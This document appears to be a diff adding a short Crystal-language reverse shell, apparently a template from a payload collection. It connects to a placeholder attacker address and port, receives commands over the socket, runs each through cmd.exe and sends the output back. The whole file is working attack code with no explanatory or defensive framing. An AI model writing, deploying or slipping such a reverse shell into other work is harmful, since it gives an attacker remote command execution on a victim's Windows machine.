@@ -1,0 +1,12 @@
+require "socket"
+require "process"
+
+c = Socket.tcp(Socket::Family::INET)
+c.connect("__IPADDR__", __PORT__)
+
+loop {
+    m, l = c.receive
+    p = Process.new("cmd.exe /c " + m.rstrip("\n"), shell: true, output: Process::Redirect::Pipe)
+    c << p.output.gets_to_end
+}
+
